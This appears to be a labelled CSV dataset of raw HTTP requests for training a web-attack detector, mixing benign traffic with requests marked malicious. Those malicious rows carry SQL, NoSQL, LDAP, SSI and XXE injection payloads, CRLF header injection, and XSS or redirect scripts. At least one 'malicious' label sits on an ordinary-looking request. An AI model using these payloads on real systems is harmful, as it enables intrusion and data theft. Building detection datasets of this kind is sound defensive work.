label,text
malicious,"GET /blog/article/view?id=12345 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0%20(Linux;%20Android%2011;%20Pixel%205)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/91.0.4472.120%20Mobile%20Safari/537.36%0d%0aX-Extra-Header:%20InjectedValue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community.game-dev-forum.org/home
Cache-Control: no-cache"
benign,"POST /api/log HTTP/1.1
Host: ecom-warehouse-inventory.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:94.0) Gecko/20100101 Firefox/94.0
Content-Type: application/json
Accept: application/json
Cache-Control: no-cache
Content-Length: 375
Connection: close

{""event"":""stock_update"",""warehouse"":{""id"":""WH_07"",""location"":{""city"":""Denver"",""state"":""CO""}},""products"":[{""sku"":""SKU12543"",""quantity"":50,""metadata"":{""receivedDate"":""2024-05-31"",""condition"":""new""}},{""sku"":""SKU12789"",""quantity"":0,""metadata"":{""receivedDate"":""2024-05-25"",""condition"":""returned""}}],""timestamp"":""2024-06-01T08:15:00Z""}"
malicious,"POST /api/v2/system/update_config HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 305
Accept: application/json, text/javascript, */*;q=0.01
Accept-Language: en-DE,en;q=0.9
Accept-Encoding: gzip, deflate
Origin: https://console.api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""timezone"": ""UTC"", ""data_sync"": true}, ""backup"": {""enabled"": true, ""frequency"": ""weekly""}}}}"
malicious,"GET /api/users/lookup?id%5B%24ne%5D=guest HTTP/1.1
Host: member-login.tech-solutions.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Charset: utf-8, iso-8859-1;q=0.5
Connection: close"
benign,"PATCH /profile/55233/preferences HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer t5mjg7xodkq2ev1rlcnz3p4fua
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: keep-alive

[
  {""op"": ""replace"", ""path"": ""/theme"", ""value"": ""dark""},
  {""op"": ""test"", ""path"": ""/notifications/email"", ""value"": true},
  {""op"": ""remove"", ""path"": ""/preferences/ads""}
]"
malicious,"GET /api/v3/items/7' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/info HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://cloud-data-services.ai/app/items
User-Agent: curl/7.77.0"
malicious,"POST /settings/privacy/update HTTP/1.1
Host: personal-data-hub.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Accept-Encoding: gzip
Referer: https://personal-data-hub.ai/settings/privacy

setting_id=75&config_b64=cHJvZHVjdF9pZD0xMjM7IERST1AgVFlQRSBVU0VSIFNFVCBhbW91bnQ9MTAwMCBXSEVSRSAxMjM7IC0t"
benign,"POST /api/v1/users/profile/update HTTP/1.1
Host: api.secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.somerandomtoken12345
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 95

{""username"":""harperjones"",""email"":""harper.jones@secure-user-portal.net"",""isAdmin"":false,""settings"":{""newsletter"":true}}"
benign,"GET /gallery/photo/details?id=903 HTTP/1.1
Host: creative-portfolio.space
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://creative-portfolio.space/gallery
Connection: keep-alive"
malicious,"POST /api/upload HTTP/1.1
Host: analytics-data-center.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/json
Content-Length: 271
Accept: application/json, text/javascript, */*; q=0.01
Cookie: sess=2b7e8fef9acf57a03b9c0a1f4defb2dd
Origin: https://analytics-data-center.ai
Cache-Control: no-cache

{
  ""callback_url"": ""/upload/complete%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://malicious.analytics-data-center.ai/payload%0d%0a%0d%0a<script>document.location='http://malicious.analytics-data-center.ai/'</script>"",
  ""file_id"": ""56db7f82""
}"
benign,"GET /data/v1/analytics/traffic/daily?date=2024-06-15 HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
App-Secret: 5a2bfd1c9e374682be0c3e45adc2d81f
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
DNT: 1"
benign,"GET /api/xml/resources/events?date=2024-06-01 HTTP/1.1
Host: event-streaming-service.biz
Authorization: Bearer a3ee4b60-b042-4b2f-b0b7-32d18c2e7514
Accept: application/xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Cache-Control: max-age=3600"
benign,"GET /static/css/main.css?v=3.4.7 HTTP/1.1
Host: next-gen-app-framework.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept: text/css,*/*;q=0.1
If-Modified-Since: Fri, 14 Apr 2023 11:05:00 GMT
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5"
benign,"POST /account/update HTTP/1.1
Host: app.cloud-insight-analytics.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Accept-Language: en-US,en;q=0.6
Origin: https://app.cloud-insight-analytics.ai
Connection: close

email=emily.rivers%40clientmail.com&phone=+12025550199&redirect_uri=https%3A%2F%2Fapp.cloud-insight-analytics.ai%2Fsettings%2Fprofile"
benign,"GET /images/logo.svg HTTP/1.1
Host: edu-resources-library.edu
Accept: image/svg+xml,image/*;q=0.9,*/*;q=0.7
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:115.0) Gecko/20100101 Firefox/115.0
Referer: https://edu-resources-library.edu/library/catalog
Cache-Control: max-age=604800
Connection: keep-alive"
benign,"POST /login HTTP/1.1
Host: auth-portal-cloudservice.net
Content-Type: application/json
Accept: application/json
Origin: https://auth-portal-cloudservice.net
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.88.1
Content-Length: 79

{""username"":""eliott.barnes"",""password"":""EL!ott_2023S""}"
benign,"GET /search?q=coding+best+practices+python HTTP/1.1
Host: devinsights-cloud.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html
Referer: https://devinsights-cloud.ai/docs
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /profile/update HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept-Encoding: gzip, deflate
Cookie: cart_id=8976453210abcdef

user=tom&user_bio=<!--#INCLUDE FiLe=""/etc/hosts"" -->"
benign,"PUT /api/data/item123 HTTP/1.1
Host: updates.repository-server.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Content-Type: text/plain
Content-Length: 29
Accept: */*
Connection: keep-alive

Simple update for item 123 record."
benign,"POST /as/token.oauth2 HTTP/1.1
Host: login-vault-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Authorization: Basic YXBpX2xhbmQ6c3VwZXJzZWNyZXQxMjM=
User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; Pixel 5 Build/SQ1A.220205.004)
Accept: application/json
Connection: close

grant_type=refresh_token&refresh_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&client_id=apiLand&client_secret=supers3cret123&redirect_uri=https%3A%2F%2Fapi.land-dashboard.ai%2Foauth%2Fcallback"
benign,"GET / HTTP/1.1
Host: city-festival-events.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8
Connection: close"
benign,"POST /register HTTP/1.1
Host: financial-trade-exchange.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Referer: https://financial-trade-exchange.org/register
Origin: https://financial-trade-exchange.org
Cookie: fte-session=2847cedf480054ff9ae9e2bd
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive

username=charlotte.kim&email=charlotte.kim%40finmail.biz&password=SilverMoon44&password_confirm=SilverMoon44&terms_accepted=true"
benign,"GET /app/profile/settings HTTP/1.1
Host: secure-portal-user.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
X-Forwarded-For: 192.168.1.100
Accept-Encoding: gzip
Connection: keep-alive"
benign,"GET /fonts/nunito-regular.ttf HTTP/1.1
Host: global-event-calendar.org
Connection: keep-alive
Accept: application/font-ttf,*/*;q=0.6
Referer: https://global-event-calendar.org/css/calendar.css
Origin: https://global-event-calendar.org
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.7"
malicious,"POST /api/v3/directory/search HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 86
Accept-Language: en-US,en;q=0.9
X-Requested-With: XMLHttpRequest

{""searchFilter"": ""(&(uid=jdoe)(objectClass=inetOrgPerson))(|(uid=administrator))""}"
malicious,"POST /api/v2/system/update_config HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 292
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""theme"": ""dark"", ""notifications"": true}, ""version"": ""1.4.6"", ""locale"": ""en-US""}, ""system_flags"": {""auto_update"": false, ""send_reports"": true}}}"
benign,"POST /blog/article/987/comment HTTP/1.1
Host: panorama-newsroom.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: https://panorama-newsroom.net
Referer: https://panorama-newsroom.net/blog/article/987
Cookie: session=5f8d3e2a7c4bfa129874dcc0a2eb99e7; csrftoken=eD1vX7aM45Lp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive

comment_text=Really+enjoyed+the+insights+in+this+article%2C+especially+the+data-driven+approach.&author_name=Laura+Bridger&csrftoken=eD1vX7aM45Lp"
benign,"GET /api/v3/items/search?filter=active&page=2 HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json, text/plain, */*
DNT: 1
User-Agent: curl/7.85.0
Accept-Encoding: gzip
Connection: close"
benign,"GET /landing/promo-2024?utm_source=newsletter&utm_medium=email&utm_campaign=spring_launch HTTP/1.1
Host: offers-portal-services.net
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Referer: https://social-media-outreach.co/app/feed
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"GET /api/v1/products/search?q=laptop HTTP/1.1
Host: assets-content-uploads.internal
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache"
benign,"POST /api/articles/321/comments HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer c3828a7cd81645efb540b972b6d0a41a
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Accept-Language: en-US,en;q=0.8
Content-Length: 154
Connection: keep-alive

{""articleId"":321,""comment"":""VGhpcyBpcyBhIHRlc3QgY29tbWVudCB3aXRoIGltYWdlIHRoaWNrIGluYm9keSBpbi1saW5lIGJhc2U2NC4="",""userNickname"":""dev_guru_92""}"
benign,"HEAD /files/large/ebook-reader-installer.dmg HTTP/1.1
Host: oss-distribution-network.dev
User-Agent: curl/7.87.0
Accept: */*
Connection: keep-alive"
benign,"GET /search/resources/documentation?query=rest+api+pagination&version=v2.1&sort=relevance&language=en&include_examples=true&page=5&limit=10&filter=stable&format=pdf&access=public&topic=authentication&search_in=title,summary HTTP/1.1
Host: docs-developers-hub.net
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept: application/pdf,application/msword
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Referer: https://docs-developers-hub.net/resources/"
benign,"GET /newsletters/subscribe?email=userrequester%40mailbox.com HTTP/1.1
Host: green-energy-updates.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Language: en-US
Referer: https://green-energy-updates.org/news
Connection: close"
benign,"POST /user/settings/privacy HTTP/1.1
Host: privacy-guardian-services.io
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Language: en-US,en;q=0.9
Content-Length: 71
Connection: keep-alive

dnt=1&tracking_protection=enabled%26strict&preferences=ads%23none%25allowed"
benign,"POST /beacon/track HTTP/1.1
Host: analytics-secure-network.io
Origin: https://app.analytics-secure-network.io
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Length: 51

event=page_view&url=/dashboard&session=7f92a3b2d"
benign,"HEAD /help/faq/general-questions.html HTTP/1.1
Host: knowledge-base-service.cloud
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-US,en;q=0.7
Via: 1.1 google
Connection: close"
malicious,"GET /userlookup?name=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: web-chatroom-zone.biz
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://web-chatroom-zone.biz/home
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
benign,"POST /account/settings/password HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: keep-alive

old_password=oldPass%2351&new_password=Newpass%26Secure%242021&confirm_password=Newpass%26Secure%242021"
benign,"GET /api/v2/user/profile?id=1829 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.87.0
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: close"
benign,"PUT /api/v1/account/avatar HTTP/1.1
Host: user-analytics-data.ai
Authorization: Bearer VGVzdEF1dGhhbV90b2tlbg==
Content-Type: application/json
Accept: application/json
Origin: https://user-analytics-data.ai
User-Agent: Python-urllib/3.11
Content-Length: 164
Connection: close

{""accountId"": ""acc_4455zx9"", ""avatar_b64"": ""R0lGODlhEAAQAMIGAAAAAP///8AAADMzM////wAAACH5BAAAAAAALAAAAAAQABAAAANMCLrc/jDKSau9OoBeC0zZyAAp7nq9bCFLF0jM6Uslo6hLzgE4rjcAOw==""}"
benign,"POST /logout HTTP/1.1
Host: my-personal-blog-site.info
Connection: close
Content-Length: 0
Referer: https://my-personal-blog-site.info/welcome
Cookie: blog_sess=1234abcd5678ef9012345678abcd9012; visited=true
User-Agent: curl/7.85.0"
benign,"GET /docs/api/openapi.json HTTP/1.1
Host: smart-home-automation.dev
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip"
benign,"PUT /v1/settings/theme HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: ApiKey X9Wt3Lp7
Content-Type: application/json
Accept: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-G981B Build/RP1A.200720.012)
Content-Length: 140
Connection: close

{""user"": ""john_smith"", ""settings_b64"": ""eyJ0aGVtZSI6ImRhcmsiLCJmb250U2l6ZSI6MTJ9"", ""lastUpdated"": ""2024-06-01T14:22:30Z""}"
benign,"GET /library/search?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
User-Agent: curl/7.88.1
Connection: close"
benign,"GET /blogs/software-development HTTP/1.1
Host: thoughts-on-tech.us
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://dev-tutorials.net/courses/python-fundamentals
Connection: keep-alive"
malicious,"POST /api/v1/xml/data HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 234

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE item [
  <!ELEMENT item ANY >
  <!ENTITY file SYSTEM ""file:///proc/version"" >
]>
<item>
  <sku>&file;</sku>
  <description>Shipping order</description>
</item>"
benign,"GET /blog/coding/best-practices-python HTTP/1.1
Host: devinsights.tech
User-Agent: Twitterbot/1.0
Accept: text/html
Accept-Encoding: gzip
Cache-Control: max-age=3600
Connection: close"
benign,"GET /docs/installation/quickstart_guide.pdf HTTP/1.1
Host: secure-user-portal.net
Accept: application/pdf
Referer: https://secure-user-portal.net/app/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Cache-Control: no-cache"
benign,"PUT /container/uploads/docker-images/registry/manifest.json HTTP/1.1
Host: registry.devops-cloud-platform.io
User-Agent: Go-http-client/2.0
Content-Type: application/octet-stream
Content-Length: 290
Authorization: Bearer mF_9.B5f-4.1JqM
Accept-Encoding: gzip
Connection: keep-alive

ewogICJyZXBvc2l0b3J5IjogImRvY2tlci1pbWFnZXMiLAogICJ2ZXJzaW9uIjogIjEuMC4wIiwKICAicGF5bG9hZCI6IHsKICAgICJtZWRpYSI6ICJKU09OLCBpbWFnZSBkYXRhIiwKICAgICJkZXNjcmlwdGlvbiI6ICJBIHBsbGFjZWhvbGRlciBmb3IgaW1hZ2UgZGF0YSIKICB9Cn0="
benign,"GET /api/v3/reviews?product_id=3245&rating=5 HTTP/1.1
Host: ratings.consumer-hub.net
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTQ2MzgiLCJyb2xlIjoidXNlciJ9.UyQKWBbh4nX5q47N4wDDuEbjE7e2-J-8QBpp0k-XsPw0_6N0UVRoT11QPeBPhF1hfoTxlLYqA2Gc9vLrFwxIKTmEgt3pqZ3IKGSSMup_4GyJMtMCtHXPC8Mt45PGuJrdzp2LwkbFZ_Xt6FkaMFMwb-jizZ5zOw3VEzJXcPj9zRM
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /api/account/settings/preferences HTTP/1.1
Host: user-settings.secure-control-platform.net
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://secure-control-platform.net
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.sFlKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Cache-Control: no-cache
User-Agent: curl/7.79.1
Accept-Language: en-US"
